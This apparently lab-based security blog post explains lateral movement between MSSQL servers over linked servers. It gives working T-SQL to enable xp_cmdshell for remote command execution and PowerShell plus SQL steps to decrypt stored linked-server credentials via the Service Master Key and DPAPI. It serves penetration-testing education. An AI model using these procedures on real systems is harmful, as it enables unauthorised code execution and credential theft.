---
title: 4. Lateral Movement between mssql servers
description: MSSQL server enumeration and exploitation series 
date: 2025-04-12 02:47:38 +/-0005
categories: [Active Directory, MSSQL]
tags: [Active Directory, MSSQL, Lateral Movement, HTB Academy]
---

<style>
  details {
    margin: 20px 0;
  }

  summary {
    font-weight: bold;
    cursor: pointer;
  }

  summary:hover {
    color: #007BFF;
  }

  ul {
    margin-left: 20px;
  }
</style>
---
* TOC
{:toc}

---

## ðŸ”— Lateral Movement using Linked Servers in MSSQL

Lateral movement between MSSQL servers involves leveraging access to one SQL Server to move laterally to other servers in the network. This can be achieved through built-in features, misconfigurations, or trust relationships. The most well-known technique for lateral movement between MSSQL servers is Linked Servers (Database Trusts). However, there are other methods such as Reusing Credentials and CLR Assemblies. In this blog, I will focus on Linked Servers.


### ðŸ§  Concept

A *Linked Server* allows one SQL Server instance (Server A) to execute queries on another SQL Server instance (Server B). It enables **cross-server communication**, often configured for database integration or centralized data access.


### ðŸŽ¯ Use Cases in Offensive Security

If you're on a compromised MSSQL server (Server A), and it's linked to another server ( Server B), you may:

- Enumerate linked servers.
- Execute queries on Server B remotely.
- Execute OS-level commands (`xp_cmdshell`) on Server B.
- Extract and decrypt saved linked server credentials.

---

## ðŸ› ï¸ Query Methods for Linked Servers

There are **three main ways** to query a linked server:

| Method | Use Case | Notes |
| --- | --- | --- |
| `OPENQUERY` | Query the remote server using T-SQL. | Returns a **single result set** only. |
| `EXECUTE AT` | More flexible than `OPENQUERY`. | Supports **multiple result sets** and extended procedures. |
| `OPENROWSET` | Ad-hoc connection using connection string. | Doesnâ€™t need pre-linked servers. |

---

## ðŸ” Permissions

- You **do not need** `sysadmin` role to run queries across linked servers.
- You **do need** `sysadmin` or similar high privileges on the **remote server** to execute system commands (via `xp_cmdshell`).

---

## ðŸ•µï¸â€â™‚ï¸ Enumerating Linked Servers
    
```sql
EXEC sp_linkedservers;
```

This lists all linked servers available.

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/faa4b55a-dda4-4e73-a1f4-c90262dd4d6b/image.png?table=block&id=1d385370-06ca-808d-9415-ec5cb394f4d3&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=hWszFxzTbNKFLKin4ZE2sYoP1u7fwPRrz8Bc2TpMJfk&downloadName=image.png)

There are two servers - `SQL01` , which is the server we are currently connected to, and `SQL02` , which is a remote server that is linked to this one.
    
## ðŸ” Viewing Remote Databases via `OPENQUERY`
    
```sql
SELECT * FROM OPENQUERY(SQL02, 'SELECT name, database_id, create_date FROM sys.databases');
```

This executes the inner query *on SQL02* and returns the databases back to SQL01.

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/7927839d-9488-4b59-9bee-5c7425f54cfb/image.png?table=block&id=1d385370-06ca-801d-a6f0-f825a4a7d3d6&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=DDI6FKZ_OteVs61_SDPL_ToqtJDSatB3bxZ2mU_aPB8&downloadName=image.png)
    
## ðŸ§ª Checking Remote Privileges using `OPENQUERY`
    
To check if your current login has `sysadmin` on the **remote server (e.g., SQL02)**:

```sql
SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/f3ddc15c-a99f-481b-a911-0b210819cae0/image.png?table=block&id=1d385370-06ca-8027-a5c4-ea26a652fda4&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=I_jxLMfzxy_shMJRkbebSRB_aUx6Fh10RE86n6aqMmo&downloadName=image.png)

> Use double single-quotes to escape quotes in nested queries.
{: .prompt-info }


## ðŸ› ï¸ Remote Code Execution (RCE) via Linked Servers
    
If you're confirmed `sysadmin` on the linked server (SQL02), you can enable `xp_cmdshell` and run OS commands remotely:

```sql
EXECUTE (
    'EXEC sp_configure "show advanced options", 1; RECONFIGURE;
    EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;
    EXEC xp_cmdshell "whoami";'
) AT SQL02;
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/4ba22b9e-3ce7-4866-bd62-0229210b43e0/image.png?table=block&id=1d385370-06ca-80db-abf4-f126e9f33a8d&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=cLEJzke_CdDTgGfeJG-VNrVFPQEBjQBxRt6i86c2MDc&downloadName=image.png)

If successful, the output will show the service account running SQL Server (e.g., `NT Service\MSSQLSERVER`).

This service account could be abused later as it have SeImpersonatePrivilege privilege.

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/a9206c59-8a65-4553-814c-59b3face7818/image.png?table=block&id=1d385370-06ca-80ee-aec8-e9dd604653f3&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=gtELdXpGwfzRG1QI3BByVh_iBKGB3xav0RVKpXlzHQo&downloadName=image.png)

## ðŸ§° Post-Exploitation: Decrypting Linked Server Credentials
### ðŸ” Background

After compromising a machine hosting an MSSQL Server instance with **linked servers**, it's possible to extract and decrypt the **SQL Server Authentication credentials** used for those links.

To achieve this, you must have:

- A login with the **`sysadmin` role** on the SQL Server instance.
- **Local administrator privileges** on the underlying Windows machine hosting the SQL Server.

> If you have **local administrator privileges** but not `sysadmin` access, you can escalate to `sysadmin` using this [authorization bypass technique](https://www.netspi.com/blog/entryid/133/sql-server-local-authorization-bypass/).
{: .prompt-info }


#### ðŸ”’ Where Are Linked Server Credentials Stored?

When a linked server uses **SQL Server Authentication**, the associated **username and password** are:

- Encrypted using the SQL Serverâ€™s **Service Master Key (SMK)**.
- Stored locally in the system table: `master.sys.syslnklgns`

However, this table is protected and can only be queried through a **Dedicated Admin Connection (DAC)**.
    
### ðŸ› ï¸ **Manual**

#### ðŸ§‘â€ðŸ’» 1. Connecting via DAC in SSMS
1. Close all current connections in SSMS.
2. Go to **File > New > Database Engine Query**.
3. In the **Server name**, enter: `ADMIN:SQL02`.
4. Authenticate as a local sysadmin (e.g., `SQL02\Administrator`). In this case, we will use Windows Authentication as `SQL02\Administrator` .
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/a3e9234c-f8cb-4695-a6a5-d24d7626b6e5/image.png?table=block&id=1d385370-06ca-8059-9cd5-f7850f12f549&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=CYtZJqMPLuEujzheKt7oWI7pQXlKETnP8aKgiGzdSBg&downloadName=image.png)
    
#### ðŸ”Ž 2. Query Encrypted Linked Server Credentials
    
```sql
SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash
FROM master.sys.syslnklgns
INNER JOIN master.sys.sysservers
ON syslnklgns.srvid = sysservers.srvid
WHERE LEN(pwdhash) > 0;
```

This reveals encrypted passwords (`pwdhash`) for each linked server login.

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/4e6a9ca7-77ef-4b06-8ad9-b2d6bbc968ba/image.png?table=block&id=1d385370-06ca-8097-b994-e11adf6bdc0e&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=q7S14aQpfLBL3E2hVRRbY1U0VQmS68tpXt0-RM9K7EU&downloadName=image.png)
    
#### ðŸ“¦ 3. Obtain encrypted MSK
    
The credentials stored in `sys.syslnklgns` are symmetrically encrypted with the Service Master Key, which is stored inside the `sys.key_encryptions` table with a `key_id` value of 102 .

MSSQL uses a **Service Master Key (SMK)** to encrypt the passwords. The SMK is encrypted using DPAPI (Data Protection API) and stored in:

```sql
SELECT * FROM sys.key_encryptions WHERE key_id = 102;
```

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/620e393e-74b4-457f-86f6-1a43d299742e/image.png?table=block&id=1d385370-06ca-8015-96d5-fede58040cfb&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=NJi3mvsMSQq6jJp4dC_WZxvPqxujkMqbL1TVCrzthtY&downloadName=image.png)

Youâ€™ll see two rows:
- One encrypted for **CurrentUser** 0x01
- One for **LocalMachine** â† easiest to decrypt with local admin privileges.
    
#### ðŸ”“ 4. Decrypting the Service Master Key (SMK)
1. Get DPAPI Entropy from Registry
    
    ```powershell
    Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy"
    ```
    
2. Decrypt SMK in PowerShell
    
    ```powershell
    $encryptedData = "0x...";  # From SQL query
    $encryptedData = $encryptedData.Substring(18);
    $encryptedData = -split ($encryptedData -replace '..', '0x$& ');
    $entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy;
    Add-Type -AssemblyName System.Security;
    $SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine');
    Write-Host (($SMK|ForEach-Object ToString X2) -join '');
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/a0393ee8-6737-4e60-b098-cb43f6326392/image.png?table=block&id=1d385370-06ca-80b8-95fb-e66197e049f2&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=KbFbnCsV-Q80S8re_eL0iCJvuL2U17c4qgKOfGHdKzo&downloadName=image.png)
    
    This gives you the decrypted **hex-encoded SMK**. which we may now use to decrypt the credentials found previously. 
    
    You can verify which encryption algorithm was used by checking the length of the decrypted Service Master Key . 
    
    - If it is 16 bytes long, then AES was used
    - if it is 8 bytes long then 3DES was used.
        In this case, we are running MSSQL Server 2022 , and the Service Master Key is 16 bytes long, so we know that AES is the encryption algorithm being used to encrypt the linked server credentials.
        
#### ðŸ”“ 5. Decrypting Linked Server Passwords with SMK
1. Extract IV & Ciphertext
    
    ```sql
    SELECT
        name,
        SUBSTRING(pwdhash, 5, 16) AS 'IV',
        SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext'
    FROM sys.syslnklgns
    WHERE LEN(pwdhash) > 0;
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/7fabaaf1-f607-4c49-a395-a3ea404a6f2f/image.png?table=block&id=1d385370-06ca-807e-b7ec-f04edfc1e166&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=dD9EpXmozDGCdRSF5vFMbRApnU2HXbtnwTiFXIGoF6g&downloadName=image.png)
    
2. Use CyberChef to Decrypt
    
    Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Decode_text('UTF-16LE%20(1200)'))'s **AES Decrypt** recipe:
    
    - **Key**: The SMK from PowerShell (Hex)
    - **IV**: Extracted IV from T-SQL, The first 16 bytes (after padding) of `ws_user`'s `pwdhash`
    - **Input**: Extracted Ciphertext which in this case is the remaining bytes from `ws_user` 's `pwdhash`
    - **Mode**: CBC
    - **Encoding**: Hex
    - **Output**: Decode as UTF-16LE
        
        ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/f451530a-5fdb-47ef-80de-3dc56819054a/image.png?table=block&id=1d385370-06ca-80ab-84f5-cdd2a80cff3e&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=7WnDak-h4MRZEbb3UwuysyZ1UebjxlcpyFJoTUI_DmY&downloadName=image.png)
        
    
    Youâ€™ll get the **decrypted password**, possibly with some leading junk bytes.
    
    We can now use this to authenticate against SQL01 , and if we are lucky, there may be a domain user which uses the same password.
    
    
### ðŸ¤– **Automated**
    
Thereâ€™s a PowerShell module to automate linked server password decryption:

ðŸ“Œ  [ Get-MSSQLLinkPasswords.psm1](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1)

Use this after gaining access to the target SQL host, Simply import the PowerShell module ( located on `SQL02\Administrator` 's desktop), and then invoke `Get-MSSQLLinkPasswords`

![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/038796c1-45ae-4096-a698-bf49de60991b/image.png?table=block&id=1d385370-06ca-80a8-8a5e-fa048966cec6&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744524000000&signature=RAL2WojGEcd0Lb-FfpnWQGw1WD-nzHSM5tqWyBij7Vk&downloadName=image.png)
